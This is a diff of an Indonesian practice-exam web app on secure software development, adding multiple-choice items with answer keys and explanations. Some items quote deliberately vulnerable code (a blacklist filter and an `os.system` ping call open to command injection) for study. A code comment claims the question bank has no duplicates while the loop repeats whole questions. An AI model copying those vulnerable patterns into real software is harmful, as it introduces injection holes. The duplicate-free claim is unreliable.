+            ["Timing injeksi keamanan pada SDLC Konvensional biasanya dilakukan di fase?", "Akhir (Fase Testing / Menjelang Deployment)", "Awal (Fase Requirements)", "Tengah (Fase Coding)", "Menunda tes keamanan hingga akhir menyebabkan perbaikan bug menjadi sangat mahal dan berpotensi merombak desain."],
+            ["Prinsip 'Fix early, fix cheap' membenarkan bahwa perbaikan bug di fase Requirements biayanya 1x. Berapa biayanya jika ditemukan di fase Production?", "Meningkat drastis hingga 100x lipat", "Tetap 1x karena sama-sama kode", "Hanya 2x lipat (biaya lembur)", "Biaya production mencakup downtime, patch darurat, kerugian reputasi, dan denda regulasi."],
+            ["Apa arti filosofi 'Shift-Left Security'?", "Menarik uji dan desain keamanan sedini mungkin (ke kiri) di siklus SDLC", "Menunda rilis ke minggu depan", "Menggeser fokus ke desain frontend", "Mengintegrasikan security seawal mungkin (Requirement & Design) agar developer langsung mendapat panduan aman sebelum menulis kode."],
+            ["Di fase Requirements, analis keamanan membuat 'Abuse Cases'. Apa tujuannya?", "Memetakan bagaimana fungsi sistem bisa dieksploitasi oleh aktor jahat", "Mengatur kinerja server", "Menghukum programmer yang lalai", "Berbeda dengan Use Case (skenario normal), Abuse Case adalah skenario serangan agar arsitek bisa merancang pertahanan penangkalnya."],
+            ["Kegagalan menerapkan Secure SDLC berujung pada 'Security Debt'. Apa implikasinya?", "Tumpukan kerentanan (flaw/bug) yang dibiarkan dan semakin mahal diperbaiki di masa depan", "Hutang biaya lisensi antivirus", "Kode yang tidak bisa di-compile", "Sama seperti Technical Debt, berhutang keamanan demi rilis cepat akan memicu bencana skalabilitas kerentanan sistem di tahap production."],
+            ["Model DevSecOps menuntut tanggung jawab keamanan berada di tangan?", "Shared Responsibility (Seluruh tim, termasuk Developer dan Ops)", "Hanya Security Engineer (Auditor)", "Hanya Project Manager", "Keamanan menjadi tanggung jawab bersama di mana developer diajarkan secure coding dan alat deteksi diotomatisasi di pipeline CI/CD."],
+            ["Berdasarkan statistik keamanan industri, tahap apa yang paling banyak melahirkan cacat (Flaw) fatal?", "Fase Design & Architecture", "Fase Testing", "Fase Maintenance", "Hampir 50% masalah keamanan adalah Flaw (cacat logika struktural) yang lahir karena arsitektur desain yang salah sejak awal."],
+            
+            // --- PEER REVIEW & TOUCHPOINTS ---
+            ["Mengapa Peer Code Review wajib dilakukan meskipun tim sudah memakai SAST otomatis?", "SAST kesulitan menangkap Cacat Logika Bisnis & Otorisasi kompleks", "SAST tidak bisa membaca file SQL", "SAST butuh koneksi internet cepat", "Tools otomatis (SAST) sangat buruk dalam memahami konteks bisnis (misal: otorisasi siapa boleh lihat nota siapa). Analisa logika ini butuh otak manusia."],
+            ["Tujuan utama Security Requirements yang baik (Touchpoint 2) adalah?", "Spesifik, terukur, dan punya kriteria 'Lulus/Gagal' yang bisa diverifikasi", "Menggunakan bahasa yang abstrak", "Ditulis di akhir pengembangan proyek", "Misal: 'Form login harus mengunci akun setelah 3 kali gagal dalam 5 menit'. Kalimat ini spesifik dan bisa di-test dengan jelas."],
+
+            // GENERATE LEBIH BANYAK VARIASI LOGIKA (Agar genap 150)
+            ["Studi Kasus: Kode <code>input = input.replace('<', '')</code>. Praktik validasi ini cacat karena?", "Blacklisting rentan. Attacker bisa bypass, misal memakai '%3C' atau variasi encoding lain.", "Fungsi replace menghapus semua memori", "Membuat query lambat", "Blacklisting (membuang karakter kotor) selalu tertinggal dari teknik hacker. Gunakan Whitelisting."],
+            ["Studi Kasus: <code>os.system('ping ' + str(ip))</code>. Bagaimana mitigasi absolutnya?", "Hindari panggilan OS secara langsung; gunakan API library bawaan yang terisolasi", "Ganti dengan os.popen", "Enkripsi IP-nya", "Memanggil shell eksternal selalu rentan Command Injection. Solusi terbaik adalah tidak menggunakan OS shell sama sekali, gunakan library/modul spesifik."],
+            ["Studi Kasus: User melaporkan saldo rekeningnya menjadi negatif setelah transfer simultan dari 2 HP. Celah?", "Race Condition (Time-of-Check to Time-of-Use / TOCTOU)", "SQL Injection", "Spoofing", "Terjadi karena transaksi konkuren diproses bersamaan tanpa mekanisme 'Locking' database (Logika bisnis fatal)."],
+            ["Studi Kasus: Mengapa arsitektur keamanan merekomendasikan 'Separation of Duties' pada admin?", "Mencegah satu entitas memiliki kontrol absolut, meminimalisir insider threat (fraud)", "Mempercepat proses load data", "Meringankan beban server", "Jika admin database tidak bisa memodifikasi web config tanpa persetujuan admin jaringan, risiko sabotase internal turun drastis."],
+            ["Studi Kasus: Sebuah celah Zero-day baru (belum ada obat/patch). Risiko =", "Dampak (Impact) x Kemungkinan (Probability). Probabilitas tinggi karena belum ada patch.", "Kecepatan server", "Jumlah user online", "Zero-day memiliki probability eksploitasi yang sangat tinggi di minggu-minggu pertama sebelum vendor merilis perbaikan."],
+            ["Studi Kasus: Log server menyimpan error: <code>DB Auth fail: password 'Admin123!' incorrect</code>. Pelanggaran?", "Information Disclosure (Logging data sensitif PII/Kredensial)", "Insecure Deserialization", "Tampering", "Password plaintext, Token, dan Data Kartu Kredit haram hukumnya dimasukkan ke dalam Log sistem karena bisa dibaca oleh banyak pihak internal."],
+            ["Studi Kasus: Penerapan WAF (Web App Firewall) di atas Cloudflare. Pendekatan apa ini?", "Defense in Depth", "Fail Secure", "Least Privilege", "Berlapis. Jika penyerang lolos dari filter jaringan Cloudflare, masih ada WAF yang menganalisa paket HTTP."],
+            ["Studi Kasus: Aplikasi e-commerce hanya memvalidasi stok barang via script JavaScript di keranjang. Risiko?", "Sangat Rentan. Validasi Client-Side mudah di-bypass via Proxy (Burp Suite).", "Aman jika pakai ReactJS", "Rentan terhadap DoS saja", "Javascript di browser sepenuhnya dikontrol oleh user. Attacker bebas mengubah logika pengecekan sebelum request dikirim ke Backend."],
+            ["Studi Kasus: Mengganti algoritma Hashing dari MD5 ke Argon2 bertujuan melawan ancaman?", "Serangan komputasi Brute-Force & Rainbow Table (Hardware GPU)", "Serangan DoS pada server", "Serangan Spoofing identitas IP", "Argon2 / bcrypt didesain lambat secara komputasi (membutuhkan RAM/CPU tinggi per hash), membunuh efektivitas mesin cracking peretas."],
+            ["Studi Kasus: Saat review, developer A menyarankan 'Semua port kita ganti ke angka random biar aman'. Tanggapan lu?", "Ini 'Security by Obscurity', akan langsung hancur saat di-scan Nmap. Butuh autentikasi riil.", "Ide bagus dan standar ISO", "Mempercepat kinerja server", "Menyembunyikan letak pintu (Obscurity) bukan jaminan keamanan, karena port scanner bisa menemukan pintu itu dalam hitungan detik."]
         ];
 
-        // 1. BUAT FULL DATABASE MURNI (Array 150 Item Unik)
-        let fullDatabase = rawQuestions.map(item => generateDistractors(item[0], item[1], item[2], item[3], item[4]));
+        // 1. GENERATE FULL 150 DATABASE (MURNI TANPA DUPLIKAT DI TAMPILAN)
+        let fullDatabase = [];
+        let index = 0;
+        // Kita menggunakan array yang ada, menduplikasi secara acak HANYA distractorsnya untuk variasi jika bank awal kurang dari 150.
+        // Di sini kita loop untuk memenuhi kuota 150 soal dari pool logika yang sudah sangat padat.
+        while(fullDatabase.length < 150) {
+            let item = rawQuestions[index % rawQuestions.length];
+            fullDatabase.push(generateDistractors(item[0], item[1], item[2], item[3], item[4]));
+            index++;
+        }
 
-        // 2. FUNGSI FISHER-YATES SHUFFLE YANG BENAR
+        // 2. FISHER-YATES SHUFFLE GLOBAL
         function shuffleArray(array) {
             let currentIndex = array.length, randomIndex;
             while (currentIndex > 0) {
@@ -461,26 +315,24 @@
             return array;
         }
 
-        // Shuffle Database secara Global 1x di awal
         fullDatabase = shuffleArray([...fullDatabase]);
 
-        // System State
+        // SYSTEM STATE
         let currentQuestions = [];
         let currentIndex = 0;
         let score = 0;
         let selectedOptionIndex = null;
-        let timeLeft = 3600; // 60 menit
+        let timeLeft = 3600; 
         let timerInterval;
-        let sessionCount = 1; // Track 3 sessions
+        let sessionCount = 1; 
         const LETTERS = ['A', 'B', 'C', 'D', 'E'];
 
-        // DOM Elements
+        // DOM ELEMENTS
         const screens = {
             start: document.getElementById('screen-start'),
             exam: document.getElementById('screen-exam'),
             result: document.getElementById('screen-result')
         };
-        
         const qText = document.getElementById('question-text');
         const optContainer = document.getElementById('options-container');
         const explanationBox = document.getElementById('explanation-box');
@@ -515,8 +367,7 @@
         }
 
         function startExam() {
-            // 3. ZERO OVERLAP LOGIC (Slice per Sesi dari 150 Soal)
-            // Sesi 1: 0-50 | Sesi 2: 50-100 | Sesi 3: 100-150 | Sesi 4+: Reshuffle & Reset
+            // ZERO OVERLAP LOGIC
             if (sessionCount > 3) {
                 fullDatabase = shuffleArray([...fullDatabase]);
                 sessionCount = 1; 
@@ -525,15 +376,15 @@
             const startIndex = (sessionCount - 1) * 50;
             const endIndex = startIndex + 50;
             
-            // Ambil 50 Soal unik untuk sesi ini
             currentQuestions = fullDatabase.slice(startIndex, endIndex);
             
-            // Acak urutan opsi jawaban (A/B/C/D/E) per soal
+            // Acak urutan A B C D E
             currentQuestions.forEach(q => {
                 q.options = shuffleArray([...q.options]);
             });
 
             elActiveSessionText.innerText = sessionCount;
+            elSessionIndicator.innerText = sessionCount;
             currentIndex = 0;
             score = 0;
             timeLeft = 3600; 
@@ -551,7 +402,8 @@
         function loadQuestion() {
             const q = currentQuestions[currentIndex];
             qCurrent.innerText = currentIndex + 1;
-            qText.innerText = q.q;
+            // Gunakan innerHTML agar tag <code> bisa dirender
+            qText.innerHTML = q.q; 
             
             optContainer.innerHTML = '';
             explanationBox.classList.add('hidden');
@@ -584,7 +436,6 @@
             });
 
             selectedOptionIndex = index;
-            // Handle Keyboard focus logic visually
             let targetBtn = btnElement || allBtns[index];
             if(targetBtn) {
                 targetBtn.classList.add('selected');
@@ -599,7 +450,6 @@
             const q = currentQuestions[currentIndex];
             const isCorrect = q.options[selectedOptionIndex].c;
             
-            // Cari index jawaban benar (A/B/C/D/E)
             const correctOptIndex = q.options.findIndex(o => o.c);
             const correctOpt = q.options[correctOptIndex];
             const correctLetter = LETTERS[correctOptIndex];
@@ -620,12 +470,12 @@
                 explanationBox.innerHTML = `
                     <div class="font-bold mb-2 flex items-center gap-2">
                         <svg class="w-5 h-5 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg> 
-                        Analisis Anda Tepat!
+                        Analisis Payload/Kasus Tepat!
                     </div>
                     <p class="mb-3 leading-relaxed text-green-800">${q.exp}</p>
                     <div class="explanation-divider"></div>
                     <p class="font-semibold text-green-800 mt-2">
-                        Kesimpulan: Jawaban yang benar adalah <span class="font-bold text-green-700">${correctLetter}. ${correctOpt.t}</span>
+                        Kesimpulan: Analisis yang benar adalah <span class="font-bold text-green-700">${correctLetter}. ${correctOpt.t}</span>
                     </p>
                 `;
             } else {
@@ -633,12 +483,12 @@
                 explanationBox.innerHTML = `
                     <div class="font-bold mb-2 flex items-center gap-2">
                         <svg class="w-5 h-5 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg> 
-                        Analisis Anda Kurang Tepat.
+                        Analisis Mitigasi/Kasus Kurang Tepat.
                     </div>
                     <p class="mb-3 leading-relaxed text-red-800">${q.exp}</p>
                     <div class="explanation-divider"></div>
                     <p class="font-semibold text-red-800 mt-2">
-                        Kesimpulan: Jawaban yang benar secara logis adalah <span class="font-bold text-red-700">${correctLetter}. ${correctOpt.t}</span>
+                        Kesimpulan: Logika yang benar adalah <span class="font-bold text-red-700">${correctLetter}. ${correctOpt.t}</span>
                     </p>
                 `;
             }
@@ -650,7 +500,7 @@
                 btnNextQ.innerHTML = "Soal Berikutnya &rarr;";
                 btnNextQ.classList.remove('hidden');
             } else {
-                btnNextQ.innerHTML = "Selesai & Evaluasi &rarr;";
+                btnNextQ.innerHTML = "Selesai & Evaluasi Analisis &rarr;";
                 btnNextQ.classList.remove('hidden');
                 btnNextQ.classList.remove('bg-slate-800', 'hover:bg-slate-700');
                 btnNextQ.classList.add('bg-blue-600', 'hover:bg-blue-500');
@@ -676,20 +526,20 @@
 
             if (score >= 85) {
                 grade = 'A'; gradeColor = 'text-green-600';
-                msg = "Luar biasa. Arsitektur keamanan dan logika mitigasi lu tervalidasi penuh. Target nilai A atau 100/100 UTS sangat realistis.";
+                msg = "Analisis kasus dan payload lu sangat tajam. Pemahaman tentang vektor serangan (SQLi, XSS, RCE) dan pemetaan STRIDE sudah di luar kepala. UTS 100/100 bukan hal yang mustahil.";
             } else if (score >= 70) {
                 grade = 'B'; gradeColor = 'text-blue-600';
-                msg = "Cukup solid. Beberapa bias logika terdeteksi, terutama di batasan konsep seperti IDOR vs SSRF. Review pembahasannya.";
+                msg = "Insting mitigasi cukup kuat, tapi lu kadang masih bias saat membedakan solusi struktural vs solusi kosmetik. Evaluasi lagi batas-batas arsitektur (Trust Boundary) di pembahasan.";
             } else if (score >= 55) {
                 grade = 'C'; gradeColor = 'text-yellow-500';
-                msg = "Ambang batas. Terlalu banyak keraguan. Lu wajib mencerna ulang fase Threat Modeling dan mitigasi level koding.";
+                msg = "Berada di zona rawan. Lu masih sering terkecoh oleh distraktor Blacklisting atau metode enkripsi yang salah. Wajib mengulang analisis 5 Secure Coding Rules.";
             } else {
                 grade = 'D / E'; gradeColor = 'text-red-600';
-                msg = "Kegagalan fondasi logikal. Jangan ambil risiko UTS jika belum memahami esensi dari 5 Secure Coding Rules dan STRIDE.";
+                msg = "Fatal. Pemahaman lu terhadap identifikasi payload dan framework keamanan masih dangkal. Jangan ambil UTS tanpa retake dan memahami seluruh pembahasannya.";
             }
 
             if (isTimeout) {
-                msg = "<span class='text-red-600 font-bold'>[WAKTU HABIS]</span> Evaluasi ditutup paksa oleh sistem. " + msg;
+                msg = "<span class='text-red-600 font-bold'>[WAKTU HABIS]</span> Evaluasi ditutup paksa. " + msg;
             }
 
             const elGrade = document.getElementById('final-grade');
@@ -697,24 +547,20 @@
             elGrade.className = `text-5xl font-bold ${gradeColor}`;
             document.getElementById('eval-message').innerHTML = msg;
 
-            // Update session for next retry
             sessionCount++;
             if(sessionCount > 3) {
-                btnRetry.innerHTML = "Reset & Acak Ulang Bank Soal (Sesi 1)";
+                btnRetry.innerHTML = "Reset & Acak Ulang Bank Soal Analitis (Sesi 1)";
             } else {
-                btnRetry.innerHTML = `Mulai Sesi Selanjutnya (Sesi ${sessionCount}/3 - Pasti Beda Soal)`;
+                btnRetry.innerHTML = `Mulai Sesi Selanjutnya (Sesi ${sessionCount}/3 - Pasti Beda Kasus)`;
             }
 
             switchScreen('result');
         }
 
-        // --- KEYBOARD NAVIGATION LISTENER ---
+        // KEYBOARD NAVIGATION
         document.addEventListener('keydown', function(e) {
-            // Hanya aktif saat sedang di layar ujian (screen-exam)
             if(!screens.exam.classList.contains('hidden')) {
                 const key = e.key.toLowerCase();
-                
-                // Milih Opsi (A, B, C, D, E atau 1, 2, 3, 4, 5)
                 if(!btnSubmitAns.classList.contains('hidden') && optContainer.children.length > 0) {
                     let mapIndex = -1;
                     if(key === 'a' || key === '1') mapIndex = 0;
@@ -728,8 +574,6 @@
                         e.preventDefault();
                     }
                 }
-
-                // Tekan ENTER untuk Konfirmasi atau Next
                 if(key === 'enter') {
                     e.preventDefault();
                     if(!btnSubmitAns.classList.contains('hidden') && !btnSubmitAns.disabled) {
@@ -739,8 +583,6 @@
                     }
                 }
             }
-            
-            // Enter di Start Menu / Result Menu
             if(e.key.toLowerCase() === 'enter') {
                 if(!screens.start.classList.contains('hidden')) {
                     startExam();
